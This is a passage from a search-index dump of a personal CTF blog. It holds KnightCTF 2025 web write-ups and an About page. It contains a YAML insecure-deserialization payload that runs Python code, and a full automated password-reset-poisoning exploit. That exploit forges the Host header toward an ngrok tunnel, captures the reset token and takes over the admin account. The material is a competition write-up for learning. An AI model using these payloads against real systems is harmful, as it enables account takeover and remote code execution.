\"http://172.105.121.246:5990/\" payload = '''yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"]''' print(\"\\nFLAG: \" + re.search(r'KCTF{[a-f0-9]+}', requests.get(url + base64.b64encode(payload.encode('utf-8')).decode('utf-8')).text).group(0)) ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:4","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:5","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Admin Access' from KnightCTF - 2025","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/","tags":["💉 Host Header Injection","☠️ Password Reset Poisoning","🌐 Web Security"],"title":"🌐 Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows, with a login screen: Site Presentation After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That’s when I realized that registering was pointless. Inspecting the page source, I found a strange comment: Admin Email the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the “Forgot Password” section: Forgot Password Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection. ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:1","tags":["💉 Host Header Injection","☠️ Password Reset Poisoning","🌐 Web Security"],"title":"🌐 Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So i started ngrok on port 80: And then, using Burp Suite, I modified the Host header to Host: ngrok_link. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent “Forgot Password” request with the email kctf2025@knightctf.com: Intercept After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials: username: kctf2025 password: new_password Manual Flag ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:2","tags":["💉 Host Header Injection","☠️ Password Reset Poisoning","🌐 Web Security"],"title":"🌐 Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created a fully automated exploit that performs the entire process described earlier: ngrok http 8080 # (set the ngrok url in the request.py file) python exploit.py python request.py this is exploit.py: import http.server import socketserver import requests import re from urllib.parse import urlparse, parse_qs class MyHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): # Extract the token parameter from the request token = parse_qs(urlparse(self.path).query).get('token', [None])[0] self.send_request(token) def send_request(self, token): s = requests.Session() url = \"http://45.56.68.122:7474/\" password = \"supermario45\" data ={ \"token\":token, \"new_password\":password } # Request for the password reset of the admin account s.post(url+\"reset-password\", data=data).text credentials={ \"username\":\"kctf2025\", \"password\":password } # Request login admin account with Flag extraction via Regex print(\"\\nFLAG: \" + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0)) def start_server(): PORT = 8080 with socketserver.TCPServer((\"\", PORT), MyHandler) as httpd: httpd.serve_forever() if __name__ == \"__main__\": start_server() and this is request.py: import requests requests.post(\"http://45.56.68.122:7474/forgot-password\", data={\"email\":\"kctf2025@knightctf.com\"}, headers={\"Host\":\"6cde-93-70-84-224.ngrok-free.app\"}) ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:3","tags":["💉 Host Header Injection","☠️ Password Reset Poisoning","🌐 Web Security"],"title":"🌐 Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"03/02/2025","objectID":"/posts/2025/02/03/admin-access/:0:4","tags":["💉 Host Header Injection","☠️ Password Reset Poisoning","🌐 Web Security"],"title":"🌐 Admin Access","uri":"/posts/2025/02/03/admin-access/"},{"categories":["About Me"],"content":" Hi, I'm Matteo Maccarone, a passionate computer science enthusiast with a particular interest in cybersecurity. I've always aimed to combine my curiosity with a passion for cybersecurity, approaching every new project with enthusiasm and dedication. ","date":"03/02/2025","objectID":"/about/:0:0","tags":["👤​ About Me"],"title":"👤 About Me","uri":"/about/"},{"categories":["About Me"],"content":"Who Am I I consider myself a very curious person with a strong passion for knowledge. Over the years, I’ve developed skills in programming and cybersecurity. Outside of my work, I enjoy traveling and playing CTF (Capture The Flag), which helps me maintain a balance between creativity and productivity. Check out my CTFtime and TryHackMe profiles: CTFtime TryHackMe Currently a member of the teams: Havce aetruria QnQSec ","date":"03/02/2025","objectID":"/about/:1:0","tags":["👤​ About Me"],"title":"👤 About Me","uri":"/about/"},{"categories":["About Me"],"content":"What I Do I’m currently a university student, and I occasionally try my hand at bug bounty work. In my work, I focus on finding new ways to protect web applications. Every project offers me the opportunity to improve, learn something new, and contribute to the progress of cybersecurity in a meaningful way. In my free time, I also enjoy reading and watching movies or TV series. ","date":"03/02/2025","objectID":"/about/:2:0","tags":["👤​ About Me"],"title":"👤 About Me","uri":"/about/"},{"categories":["About Me"],"content":"My Vision I firmly believe that this world is still full of things to discover. My mission is to become an established penetration tester, contributing positively to the field of cybersecurity. ","date":"03/02/2025","objectID":"/about/:3:0","tags":["👤​ About Me"],"title":"👤 About Me","uri":"/about/"},{"categories":["About Me"],"content":"Contact Me If you want to get in touch or talk about anything, feel free to reach out! You can find the links to my profiles on the homepage. I’d love to hear your thoughts or discuss new opportunities! Thanks for visiting my space! ~ mH4ck3r0n3 ","date":"03/02/2025","objectID":"/about/:4:0","tags":["👤​ About Me"],"title":"👤 About Me","uri":"/about/"}]